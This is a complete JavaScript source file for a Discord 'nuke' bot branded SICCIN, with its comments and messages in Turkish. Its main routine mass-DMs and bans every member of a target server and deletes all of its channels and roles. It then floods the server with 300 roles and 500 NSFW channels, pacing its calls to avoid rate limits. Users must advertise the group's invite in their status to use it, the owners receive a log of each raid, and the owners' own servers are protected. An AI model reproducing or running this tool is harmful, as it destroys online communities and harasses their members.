require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActivityType,
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== KORUNAN SUNUCULAR ==================
const PROTECTED_SERVERS = [
  "1457028521707962370",
  "1457597987294285979"
];

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== KORUNAN SUNUCU KONTROLÜ ==================
function isProtectedServer(guildId) {
  return PROTECTED_SERVERS.includes(guildId.toString());
}

// ================== EMBEDLER ==================
function mainSiccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#3a0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `**Özellikler**
• Anında Herkesi Banlar
• Herkese DM Çeker
• Tüm Kanal ve Rolleri Siler
• 500 Kanal & 300 Rol Oluşturur

**Nasıl Kullanılır?**
Butona tıkla ve hedef sunucu ID gir.

**⚠️ KORUNAN SUNUCULAR:**
${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`
    )
    .setFooter({ text: "ＳＩＣＣＩＮ | Glory to Siccin" })
    .setTimestamp();
}

function dmEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#2b0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `ＳＩＣＣＩＮ Tarafından
${guild.name} sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

function protectedServerErrorEmbed(targetGuildId) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚫 ERİŞİM ENGELLENDİ")
    .setDescription(
      `**${targetGuildId}** ID'li sunucu koruma altındadır!\n\nBu sunucuya herhangi bir işlem yapılamaz.`
    )
    .setTimestamp();
}

function logEmbed(data) {
  return new EmbedBuilder()
    .setColor("#1a0000")
    .setAuthor({
      name: `${data.usedGuild} | siccin ejected`,
    })
    .setThumbnail(data.targetIcon)
    .addFields(
      {
        name: "Kullanan Kişi",
        value: `ID: ${data.userId}\nKullanıcı Adı: ${data.userTag}`,
      },
      {
        name: "Hedef Sunucu",
        value: `ID: ${data.guildId}\nSunucu İsmi: ${data.guildName}`,
      },
      {
        name: "İstatistik",
        value:
          `Banlanan Kişi Sayısı: **${data.banned}**\n` +
          `Silinen Rol Sayısı: **${data.rolesDeleted}**\n` +
          `Silinen Kanal Sayısı: **${data.channelsDeleted}**\n` +
          `Eklenen Rol Sayısı: **${data.rolesCreated}**\n` +
          `Eklenen Kanal Sayısı: **${data.channelsCreated}**`,
      }
    );
}

function protectionAlertEmbed(data) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚨 KORUNAN SUNUCUYA ERİŞİM DENEMESİ")
    .addFields(
      {
        name: "Kullanıcı",
        value: `${data.userTag} (${data.userId})`,
        inline: true,
      },
      {
        name: "Bulunduğu Sunucu",
        value: `${data.usedGuild}`,
        inline: true,
      },
      {
        name: "Hedef Sunucu ID",
        value: `${data.targetGuildId}`,
        inline: false,
      },
      {
        name: "Durum",
        value: "ENGELLENDİ",
        inline: true,
      }
    )
    .setTimestamp();
}

// ================== ASENKRON BEKLEME FONKSİYONU ==================
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, targetGuildId) {
  const executor = interaction.user;
  const usedGuild = interaction.guild.name;

  // KORUNAN SUNUCU KONTROLÜ
  if (isProtectedServer(targetGuildId)) {
    const alertData = {
      userTag: executor.tag,
      userId: executor.id,
      usedGuild: usedGuild,
      targetGuildId: targetGuildId
    };
    
    const alertEmbed = protectionAlertEmbed(alertData);
    
    try {
      await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
    } catch (err) {
      console.error("Owner'a bildirim gönderilemedi:", err);
    }
    
    return interaction.followUp({
      embeds: [protectedServerErrorEmbed(targetGuildId)],
      ephemeral: true,
    });
  }

  const guild = client.guilds.cache.get(targetGuildId);
  if (!guild)
    return interaction.followUp({
      content: "❌ Bot hedef sunucuda değil",
      ephemeral: true,
    });

  await interaction.followUp({
    content: "🔥 SICCiN BAŞLATILDI\n⏳ İşlemler sırayla yapılıyor...",
    ephemeral: true,
  });

  let banned = 0,
    rolesDeleted = 0,
    channelsDeleted = 0;

  // ================== BAN İŞLEMLERİ ==================
  try {
    const members = await guild.members.fetch();
    
    // Önce DM gönder
    for (const m of members.values()) {
      if (m.user.bot) continue;
      try {
        await m.send({ embeds: [dmEmbed(guild)] });
        await delay(50); // Rate limit için bekle
      } catch (dmErr) {
        // DM gönderilemezse devam et
      }
    }
    
    // Sonra banla
    for (const m of members.values()) {
      if (m.user.bot) continue;
      try {
        await m.ban({ reason: "ＳＩＣＣＩＮ 🔱" });
        banned++;
        await delay(100); // Rate limit için bekle
      } catch (banErr) {
        // Banlanamazsa devam et
      }
    }
  } catch (err) {
    console.error("Ban işlemlerinde hata:", err);
  }

  // ================== KANALLARI SİL ==================
  try {
    const channels = Array.from(guild.channels.cache.values());
    
    for (const channel of channels) {
      try {
        await channel.delete().catch(() => {});
        channelsDeleted++;
        await delay(200); // Rate limit için bekle
      } catch (channelErr) {
        // Silinemezse devam et
      }
    }
  } catch (err) {
    console.error("Kanal silme hatası:", err);
  }

  // ================== ROLLERİ SİL ==================
  try {
    const roles = Array.from(guild.roles.cache.values());
    
    for (const role of roles) {
      if (role.managed || role.id === guild.id) continue; // Bot rolleri ve @everyone rolünü silme
      try {
        await role.delete().catch(() => {});
        rolesDeleted++;
        await delay(200); // Rate limit için bekle
      } catch (roleErr) {
        // Silinemezse devam et
      }
    }
  } catch (err) {
    console.error("Rol silme hatası:", err);
  }

  // ================== YENİ ROLLER OLUŞTUR ==================
  let rolesCreated = 0;
  try {
    for (let i = 0; i < 300; i++) {
      try {
        await guild.roles.create({ 
          name: `ＳＩＣＣＩＮ 🔱 ${i+1}`,
          color: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
          permissions: []
        });
        rolesCreated++;
        
        // Her 10 rolde bir daha uzun bekle
        if (i % 10 === 0) {
          await delay(500);
        } else {
          await delay(100);
        }
        
      } catch (roleCreateErr) {
        // Rol oluşturulamazsa devam et
        console.log(`Rol ${i+1} oluşturulamadı:`, roleCreateErr.message);
      }
    }
  } catch (err) {
    console.error("Rol oluşturma hatası:", err);
  }

  // ================== YENİ KANALLAR OLUŞTUR ==================
  let channelsCreated = 0;
  try {
    for (let i = 0; i < 500; i++) {
      try {
        await guild.channels.create({ 
          name: `ＳＩＣＣＩＮ-${i+1}`,
          type: 0, // 0 = text kanalı, 2 = voice kanalı
          topic: "ＳＩＣＣＩＮ tarafından ele geçirildi 🔱",
          nsfw: true,
          rateLimitPerUser: 10
        });
        channelsCreated++;
        
        // Her 20 kanalda bir daha uzun bekle
        if (i % 20 === 0) {
          await delay(800);
        } else {
          await delay(150);
        }
        
      } catch (channelCreateErr) {
        // Kanal oluşturulamazsa devam et
        console.log(`Kanal ${i+1} oluşturulamadı:`, channelCreateErr.message);
      }
    }
  } catch (err) {
    console.error("Kanal oluşturma hatası:", err);
  }

  // ================== LOG GÖNDER ==================
  const log = logEmbed({
    usedGuild,
    userId: executor.id,
    userTag: executor.tag,
    guildId: guild.id,
    guildName: guild.name,
    targetIcon: guild.iconURL({ dynamic: true }),
    banned,
    rolesDeleted,
    channelsDeleted,
    rolesCreated,
    channelsCreated,
  });

  try {
    await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] }));
    await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] }));
  } catch (logErr) {
    console.error("Log gönderilemedi:", logErr);
  }

  // ================== İŞLEM TAMAMLANDI BİLDİRİMİ ==================
  try {
    await interaction.followUp({
      content: `✅ SICCiN İŞLEMİ TAMAMLANDI!\n\n` +
               `Banlanan: ${banned} kişi\n` +
               `Silinen: ${channelsDeleted} kanal, ${rolesDeleted} rol\n` +
               `Oluşturulan: ${channelsCreated} kanal, ${rolesCreated} rol\n\n` +
               `#GLORY TO ＳＩＣＣＩＮ 🔱`,
      ephemeral: true,
    });
  } catch (finalErr) {
    console.error("Final bildirimi gönderilemedi:", finalErr);
  }
}

// ================== MESSAGE İŞLEME ==================
client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.guild) return;

  // .siccin komutu kontrolü
  if (message.content.toLowerCase() === ".siccin") {
    try {
      // İsterseniz bu kontrolü kaldırabilirsiniz
      if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
        return message.reply({ 
          content: "❌ Bu komutu kullanma yetkiniz yok!",
          ephemeral: true 
        }).catch(() => {});
      }
      
      const embed = mainSiccinEmbed(message.guild);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("siccinStart")
          .setLabel("ＳＩＣＣＩＮ BAŞLAT")
          .setStyle(ButtonStyle.Danger)
          .setEmoji("🔥")
      );
      
      await message.channel.send({ 
        embeds: [embed], 
        components: [row] 
      });
      
    } catch (error) {
      console.error("Embed gönderilemedi:", error);
      message.reply("❌ Embed gönderilirken hata oluştu!").catch(() => {});
    }
    return;
  }

  // ID ekleme komutu (Owner için)
  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !ekle <sunucu-id>");
    }

    const newId = args[1];
    if (PROTECTED_SERVERS.includes(newId)) {
      return message.reply("Bu ID zaten koruma listesinde!");
    }

    PROTECTED_SERVERS.push(newId);
    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // ID silme komutu (Owner için)
  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !sil <sunucu-id>");
    }

    const removeId = args[1];
    const index = PROTECTED_SERVERS.indexOf(removeId);
    if (index === -1) {
      return message.reply("Bu ID koruma listesinde bulunamadı!");
    }

    PROTECTED_SERVERS.splice(index, 1);
    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // Liste görüntüleme komutu
  if (message.content === "!korunanlar") {
    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }
});

// ================== INTERACTION İŞLEME ==================
client.on("interactionCreate", async (interaction) => {
  // ================== BUTTON ==================
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("guildID")
            .setLabel("Hedef Sunucu ID")
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setPlaceholder("Sunucu ID'sini girin...")
        )
      );

    return interaction.showModal(modal);
  }

  // ================== MODAL ==================
  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    
    if (!hasSiccinStatus(member)) {
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });
    }

    const gid = interaction.fields.getTextInputValue("guildID").trim();

    // KORUNAN SUNUCU KONTROLÜ
    if (isProtectedServer(gid)) {
      const alertData = {
        userTag: interaction.user.tag,
        userId: interaction.user.id,
        usedGuild: interaction.guild.name,
        targetGuildId: gid
      };
      
      const alertEmbed = protectionAlertEmbed(alertData);
      
      try {
        await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
        await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      } catch (err) {
        console.error("Owner'a bildirim gönderilemedi:", err);
      }
      
      return interaction.reply({
        embeds: [protectedServerErrorEmbed(gid)],
        ephemeral: true,
      });
    }

    await interaction.deferReply({ ephemeral: true });
    return startSiccin(interaction, gid);
  }
});

// ================== BOT HAZIR ==================
client.on("ready", () => {
  console.log(`${client.user.tag} olarak giriş yapıldı!`);
  console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
  
  client.user.setActivity({
    name: ".siccin | 500 kanal, 300 rol",
    type: ActivityType.Playing,
  });
  
  console.log("═══════════════════════════════════════");
  console.log("SICCiN BOT AKTİF");
  console.log("Özellikler:");
  console.log("- Tüm üyeleri banlar + DM gönderir");
  console.log("- Tüm kanalları siler (500 kanal oluşturur)");
  console.log("- Tüm rolleri siler (300 rol oluşturur)");
  console.log("- Rate limit korumalı");
  console.log("═══════════════════════════════════════");
});

// ================== CRASH KALKAN ==================
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED REJECTION:", err);
});
process.on("uncaughtException", (err) => {
  console.log("UNCAUGHT EXCEPTION:", err);
});

client.login(BOT_TOKEN);
